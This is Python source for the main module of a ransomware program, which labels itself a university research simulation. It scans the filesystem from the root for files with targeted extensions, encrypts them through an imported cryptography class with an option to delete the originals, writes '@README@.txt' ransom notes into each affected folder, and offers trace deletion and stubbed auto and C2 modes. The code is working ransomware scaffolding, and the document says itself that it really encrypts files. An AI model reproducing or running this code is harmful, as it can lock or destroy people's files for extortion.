import os
from crypto import CryptoGraphy

class Program():
    def __init__(self, data = None):
        self.__mode__ = "manual"  # default mode
        self.__system__ = "Darwin"  # default system
        self.__criptography: CryptoGraphy = None
        self.__directories_with_files = []
        self.__found_files = []
        if data is not None:
            pass
        
    def start(self):
        print("This is the ransomware main module.")
        print("What would you like to do?")
        if self.__mode__ == "manual":
            self.__cli()

    def __help(self):
        print("Available commands:")
        print("\thelp - show this help message")
        print("\tgreet - print a greeting")
        print("\tinfo - displays information about the ransomware")
        print("\tchangeMode - changes the mode of operation")
        print("\t\tDefault mode is 'manual'")
        print("\t\tAvilable modes: auto, c2, manual")
        print("\tenvcheck - checks the environment in which the program is running")
        print("\tdirectory - discovers the files in the system avoiding specific file types and folders")
        print("\t\tDefault is '/'")
        print("\t\tExample: directory /Users/username/Documents")
        print("\tsetup - sets up the cryptographic configuration")
        print("\t\tOptions: ") 
        print("\t\t\t--encrypt (enables encryption) ")
        print("\t\t\t--delete (deletes files after encryption/decryption)")
        print("\tencrypt - encrypts the discovered files")
        print("\transomnote - displays the ransom note to the user")
        print("\tdecrypt - decrypts the previously encrypted files")
        print("\tdeletetraces - deletes traces of the program")
        print("\texit or quit - quit the program")

    def __info(self):
        print("This code is a ransomware simulation tool made for educational purposes as part of a university research project.")
        print("It is still able to encrypt files in your system, so be cautious when using it, specially in auto mode")
                
    def __change_mode(self, new_mode = "manual"):
        self.__mode__ = new_mode
        print(f"Mode changed to {self.__mode__}")
        match self.__mode__:
            case "auto":
                print("Auto mode selected. The program will run without user interaction.")
            case "c2":
                print("C2 mode selected. The program will attempt to connect to a command and control server.")
            case "manual":
                print("Manual mode selected. The program will wait for user input.")
                
    def __envcheck(self):
        import platform

        self.__system__ = platform.system()
        print("System:", self.__system__)        # 'Windows', 'Linux', 'Darwin'
        print("Release:", platform.release())
        print("Version:", platform.version())
        print("Machine:", platform.machine())      # 'x86_64', 'arm64'
        print("Processor:", platform.processor())
        print(platform.platform())




    def __directory(self, start_path="/", skipped_folders=None, targeted_extensions=None):
        import json
        with open("conf.json", "r") as conf_file:
                data = json.load(conf_file)

        if skipped_folders is None:
            general = data.get("skipped_directories_general", [])
            folders = data.get("skipped_directories_" + self.__system__, [])
            skipped_folders = general + folders

        if targeted_extensions is None:
            targeted_extensions = data.get("targeted_extensions", [])

        self.__found_files = []
        self.__directories_with_files = []

        for root, dirs, files in os.walk(start_path):
            print(f"Current directory: {root}")
            dirs[:] = [d for d in dirs if d not in skipped_folders and not d.startswith('.') and not d.endswith('.app')]
            files = [f for f in files if any(f.endswith(ext) for ext in targeted_extensions)]
            for d in dirs:
                 print(f"  [DIR]  {os.path.join(root, d)}")

            if files:
                self.__directories_with_files.append(root)

            for f in files:
                self.__found_files.append(os.path.join(root, f))

        print(self.__directories_with_files)
        print(f"Total files found: {len(self.__found_files)}")
        print(f"Total directories with targeted files: {len(self.__directories_with_files)}")

    def __setup(self, should_encrypt=False, should_delete_original=False):
        self.__criptography = CryptoGraphy(should_encrypt=should_encrypt, should_delete_original=should_delete_original)
        self.__criptography.setup()
        print(f"Encryption: {should_encrypt}, Delete original files: {should_delete_original}")

    def __encrypt(self):
        if self.__criptography is None:
            print("Cryptography not set up. Please run 'setup' first.")
            return

        print("Encrypting files...")
        for file in self.__found_files:
            self.__criptography.encrypt(file)

    def __ransomnote(self):
        with open("ransom_note.txt", "r") as note_file:
            content = note_file.read()

        for dir in self.__directories_with_files:
            self.__create_ransomnote_file(dir, content)

    def __create_ransomnote_file(self, dst_path=".", content=None):
        with open(dst_path + "/@README@.txt", "w") as output_file:
            output_file.write(content)

    def __decrypt(self):
        if self.__criptography is None:
            print("Cryptography not set up. Please run 'setup' first.")
            return

        for file in self.__found_files:
            self.__criptography.decrypt(file + ".ENCRYPTED")

    def __delete_traces(self):
        print("Deleting traces...")
        
        for dir in self.__directories_with_files:
            ransomnote_path = dir + "/@README@.txt"
            if os.path.exists(ransomnote_path):
                os.remove(ransomnote_path)

    def __cli(self):
        while True:
            inp = input("MyCLI> ").strip()
            command = inp.split()[0]

            match command:
                case "help":
                    self.__help()

                case "greet":
                    print("Hello! This is your custom CLI.")

                case "info":
                    self.__info()
                    
                case "changeMode":
                    if len(inp.split()) > 1 and inp.split()[1] in ["auto", "c2", "manual"]:
                        self.__change_mode(inp.split()[1])
                    else:
                        print("Mode not available. Available modes: auto, c2, manual")

                case "envcheck":
                    self.__envcheck()

                case "directory":
                    dir = " ".join(inp.split()[1:]) if len(inp.split()) > 1 else "/"
                    self.__directory(dir)

                case "setup":
                    should_encrypt = "--encrypt" in inp.split()
                    should_delete_original = "--delete" in inp.split()
                    self.__setup(should_encrypt=should_encrypt, should_delete_original=should_delete_original)

                case "loadkey": 
                    self.__criptography.load_key()

                case "encrypt":
                    self.__encrypt()

                case "ransomnote":
                    self.__ransomnote()

                case "decrypt":
                    self.__decrypt()

                case "deletetraces":
                    self.__delete_traces()

                case "exit" | "quit":
                    print("Exiting...")
                    break

                case "":   # empty input
                    pass

                case _:
                    print(f"Unknown command: {command}")



if __name__ == "__main__":
    program = Program()
    program.start()